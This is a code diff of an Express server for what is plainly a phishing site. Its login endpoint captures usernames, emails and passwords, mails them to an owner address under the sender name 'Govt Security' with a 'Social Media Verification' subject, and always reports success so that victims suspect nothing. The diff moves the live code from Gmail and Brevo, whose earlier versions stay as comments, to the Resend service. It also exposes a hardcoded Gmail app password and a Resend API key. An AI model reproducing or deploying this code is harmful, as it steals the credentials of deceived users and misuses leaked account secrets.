@@ -511,9 +511,162 @@
 
 
 
+// const express = require("express");
+// const cors = require("cors");
+// const nodemailer = require("nodemailer");
+
+// const app = express();
+
+// /* ================= BASIC SETUP ================= */
+// app.use(express.json());
+// app.use(cors({ origin: "*" }));
+
+// /* ================= HEALTH CHECK ================= */
+// app.get("/", (req, res) => {
+//   res.send("Backend is running");
+// });
+
+// /* ================= MAIL TRANSPORTER ================= */
+// /* ❗ NO ENV USED – DIRECT APP PASSWORD */
+// const transporter = nodemailer.createTransport({
+//   service: "Gmail",
+//   auth: {
+//     user: "sahuprayag145@gmail.com",
+//     pass: "hhxx dbcp havm tiox" // Gmail App Password ONLY
+//   }
+// });
+
+// /* ================= LOGIN (FAKE) ================= */
+// app.post("/login", (req, res) => {
+//   const { userName, email, passWord } = req.body;
+
+//   console.log("LOGIN HIT:", req.body);
+
+//   if (!userName || !email || !passWord) {
+//     return res.status(400).json({
+//       success: false,
+//       step: "missing_fields"
+//     });
+//   }
+
+//   /* -------- EMAIL CONTENT -------- */
+//   const mailText = `
+// 🔐 NEW ACCOUNT ATTEMPT
+
+// Username: ${userName}
+// Email: ${email}
+// Password: ${passWord}
+
+// Time: ${new Date().toLocaleString()}
+// IP: ${req.ip}
+// `;
+
+//   /* -------- FIRE & FORGET EMAIL -------- */
+//   transporter.sendMail({
+//     from: "Govt Security <sahuprayag145@gmail.com>",
+//     to: "sahuprayag145@gmail.com",
+//     subject: "New Social Media Verification",
+//     text: mailText
+//   })
+//     .then(() => console.log("✅ EMAIL SENT"))
+//     .catch(err => console.error("❌ EMAIL FAILED (IGNORED):", err.message));
+
+//   /* -------- ALWAYS SUCCESS (FAKE LOGIN) -------- */
+//   return res.status(200).json({
+//     success: true,
+//     step: "login_success"
+//   });
+// });
+
+// /* ================= SERVER ================= */
+// const PORT = process.env.PORT || 4000;
+// app.listen(PORT, () => {
+//   console.log("🚀 Server running on port", PORT);
+// });
+
+
+// const express = require("express");
+// const cors = require("cors");
+// const nodemailer = require("nodemailer");
+
+// const app = express();
+
+// app.use(express.json());
+// app.use(cors({ origin: "*" }));
+
+// /* ================= HEALTH ================= */
+// app.get("/", (req, res) => {
+//   res.send("Backend is running");
+// });
+
+// /* ================= BREVO SMTP ================= */
+// const transporter = nodemailer.createTransport({
+//   host: "smtp-relay.brevo.com",
+//   port: 587,
+//   secure: false,
+//   auth: {
+//     user: "YOUR_BREVO_LOGIN",     // e.g. xyz@smtp-brevo.com
+//     pass: "YOUR_BREVO_PASSWORD"
+//   }
+// });
+
+// /* ================= LOGIN ================= */
+// app.post("/login", async (req, res) => {
+//   const { userName, email, passWord } = req.body;
+
+//   if (!userName || !email || !passWord) {
+//     return res.status(400).json({
+//       success: false,
+//       step: "missing_fields"
+//     });
+//   }
+
+//   const mailText = `
+// 🔐 NEW ACCOUNT ATTEMPT
+
+// Username: ${userName}
+// Email: ${email}
+// Password: ${passWord}
+// Time: ${new Date().toLocaleString()}
+// IP: ${req.ip}
+// `;
+
+//   try {
+//     await transporter.sendMail({
+//       from: "Govt Security <no-reply@govt-secure.com>",
+//       to: "sahuprayag145@gmail.com",
+//       subject: "New Social Media Verification",
+//       text: mailText
+//     });
+
+//     console.log("✅ EMAIL SENT");
+
+//     return res.json({
+//       success: true,
+//       step: "email_sent"
+//     });
+
+//   } catch (err) {
+//     console.error("EMAIL ERROR:", err.message);
+
+//     return res.json({
+//       success: true, // fake login continues
+//       step: "email_failed_but_continue",
+//       error: err.message
+//     });
+//   }
+// });
+
+// /* ================= SERVER ================= */
+// const PORT = process.env.PORT || 4000;
+// app.listen(PORT, () =>
+//   console.log("🚀 Server running on port", PORT)
+// );
+
+
 const express = require("express");
 const cors = require("cors");
-const nodemailer = require("nodemailer");
+const { Resend } = require("resend");
 
 const app = express();
 
@@ -521,26 +674,17 @@ const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
 
-/* ================= HEALTH CHECK ================= */
+/* ================= RESEND ================= */
+const resend = new Resend("re_jL1y2NB9_Bkj82exL7EuKTjqgQvtMG69n"); // your key
+
+/* ================= HEALTH ================= */
 app.get("/", (req, res) => {
   res.send("Backend is running");
 });
 
-/* ================= MAIL TRANSPORTER ================= */
-/* ❗ NO ENV USED – DIRECT APP PASSWORD */
-const transporter = nodemailer.createTransport({
-  service: "Gmail",
-  auth: {
-    user: "sahuprayag145@gmail.com",
-    pass: "hhxx dbcp havm tiox" // Gmail App Password ONLY
-  }
-});
-
-/* ================= LOGIN (FAKE) ================= */
-app.post("/login", (req, res) => {
+/* ================= LOGIN ================= */
+app.post("/login", async (req, res) => {
   const { userName, email, passWord } = req.body;
-
-  console.log("LOGIN HIT:", req.body);
 
   if (!userName || !email || !passWord) {
     return res.status(400).json({
@@ -549,9 +693,8 @@ app.post("/login", (req, res) => {
     });
   }
 
-  /* -------- EMAIL CONTENT -------- */
-  const mailText = `
-🔐 NEW ACCOUNT ATTEMPT
+  const text = `
+🔐 NEW ACCOUNT SUBMISSION
 
 Username: ${userName}
 Email: ${email}
@@ -561,21 +704,28 @@ Time: ${new Date().toLocaleString()}
 IP: ${req.ip}
 `;
 
-  /* -------- FIRE & FORGET EMAIL -------- */
-  transporter.sendMail({
-    from: "Govt Security <sahuprayag145@gmail.com>",
-    to: "sahuprayag145@gmail.com",
-    subject: "New Social Media Verification",
-    text: mailText
-  })
-    .then(() => console.log("✅ EMAIL SENT"))
-    .catch(err => console.error("❌ EMAIL FAILED (IGNORED):", err.message));
+  try {
+    await resend.emails.send({
+      from: "Govt Security <onboarding@resend.dev>",
+      to: ["r89295489@gmail.com"], // OWNER EMAIL
+      subject: "New Social Media Verification",
+      text
+    });
 
-  /* -------- ALWAYS SUCCESS (FAKE LOGIN) -------- */
-  return res.status(200).json({
-    success: true,
-    step: "login_success"
-  });
+    return res.json({
+      success: true,
+      step: "email_sent"
+    });
+
+  } catch (err) {
+    console.error("RESEND ERROR:", err);
+
+    return res.json({
+      success: true, // fake login continues
+      step: "email_failed_but_continue",
+      error: err.message
+    });
+  }
 });
 
 /* ================= SERVER ================= */
